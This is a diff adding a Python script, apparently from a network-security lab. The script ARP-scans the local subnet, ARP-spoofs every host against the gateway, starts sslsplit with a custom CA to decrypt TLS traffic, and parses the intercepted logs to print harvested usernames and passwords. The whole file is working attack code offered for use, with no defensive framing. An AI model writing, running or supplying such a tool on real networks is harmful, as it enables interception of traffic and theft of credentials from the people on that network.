@@ -1,0 +1,123 @@
+#!/usr/bin/env python3
+
+import os
+import netifaces
+import math
+from scapy.all import ARP, Ether, srp, send
+from time import sleep
+import threading
+from subprocess import Popen, DEVNULL
+
+logdir_path =  './tmp/logdir'
+run_event = threading.Event()
+available_dev = {}
+userfile = {}
+
+def main():
+    if os.geteuid() != 0:
+        exit('You should run as root')
+    arp_scan()
+    
+    # init thread for arp_spoofing
+    try:
+        t1 = threading.Thread(target = arp_spoof)
+        t1.start()
+    except:
+        print("Thread(arp spoof) init failure")
+
+    # implement sslsplit
+    sleep(2)
+    Popen(['sudo', 'sslsplit', '-D', '-l', './tmp/connect.log', '-j', './tmp', '-S', './tmp/logdir/', '-p', './tmp/sslsplitPID', '-k', 'ca.key', '-c', 'ca.crt', 'ssl', '0.0.0.0', '8443'], stdout = DEVNULL, stderr = DEVNULL)
+    # os.system('sudo sslsplit -D -l ./tmp/connect.log -j ./tmp -S ./tmp/logdir/ -p ./tmp/sslsplitPID -k ca.key -c ca.crt ssl 0.0.0.0 8443')
+
+    # detect ctrl+C
+    try:
+        while True:
+            grab_user()
+            sleep(.5)
+    except KeyboardInterrupt:
+        print("\nthread starts closing...")
+        run_event.set()
+        t1.join()
+        print("thread has closed!!")
+
+
+def arp_scan():
+    '''
+    ipv4 = {'addr': '192.168.211.135', 'netmask': '255.255.255.0', 'broadcast': '192.168.211.255'}
+    '''
+    ipv4 = netifaces.ifaddresses('ens33')[netifaces.AF_INET][0]
+
+    cidr = 32
+    for m in ipv4['netmask'].split('.'):
+        cidr -= int(math.log2(256 - int(m)))
+
+    net = ipv4['addr'] + f'/{cidr}'
+    arp = ARP(pdst = net)
+    broadcast = Ether(dst = 'ff:ff:ff:ff:ff:ff')
+    ans, unans = srp(broadcast/arp, timeout = 2, verbose = False)
+
+    for snt, rcv in ans:
+        available_dev[rcv.psrc] = rcv.hwsrc
+
+    print("Available devices")
+    print("-----------------------------------")
+    print("IP                MAC              ")
+    print("-----------------------------------")
+    for k, v in available_dev.items():
+        print(f'%-15s%20s' %(k, v))
+    print()
+
+
+def arp_spoof():
+    '''
+    gateway = ('192.168.211.2', 'ens33')
+
+    ARP(op=2, pdst=victim_ip, hwdst=get_mac(victim_ip), psrc=original_ip)
+    # op=1 -> request; op=2 -> reply
+    # set psrc to make victim_ip misunderstand the source is from router (in fact from attacker)  
+    '''
+    gateway = netifaces.gateways()['default'][netifaces.AF_INET]
+    arppkts = []
+    for vic_ip, vic_mac in available_dev.items():
+        if vic_ip == gateway[0]:
+            continue
+        arp2vic = ARP(op=2, pdst = vic_ip, hwdst = vic_mac, psrc = gateway[0])
+        arp2rt = ARP(op=2, pdst = gateway[0], hwdst = available_dev[gateway[0]], psrc = vic_ip)
+        arppkts.append((arp2vic, arp2rt))
+    while True:
+        for idx in range(len(arppkts)):
+            send(arppkts[idx][0], verbose = False)
+            send(arppkts[idx][1], verbose = False)
+        sleep(2)
+        if run_event.is_set():
+            break
+
+def grab_user():
+    allfiles = os.listdir(logdir_path)
+    for file_ in allfiles:
+        with open(f'{logdir_path}/{file_}', 'rb') as f:
+            for line in f:
+                try:
+                    line = line.decode("utf-8")
+                    # print(line)
+                    if 'username' in line and 'password' in line:
+                        data = line.split('&')
+                        user = data[1].split('=')[1]
+                        pswd = str(data[2].split('=')[1])
+                        if user in userfile:
+                            if pswd in userfile[user]:
+                                continue
+                            else:
+                                userfile[user].append(pswd)
+                        else:
+                            userfile[user] = [pswd]
+                        print(f'Username: {user}')
+                        print(f'Password: {pswd}')
+                except:
+                    continue
+
+
+        
+if __name__ == '__main__':
+    main()
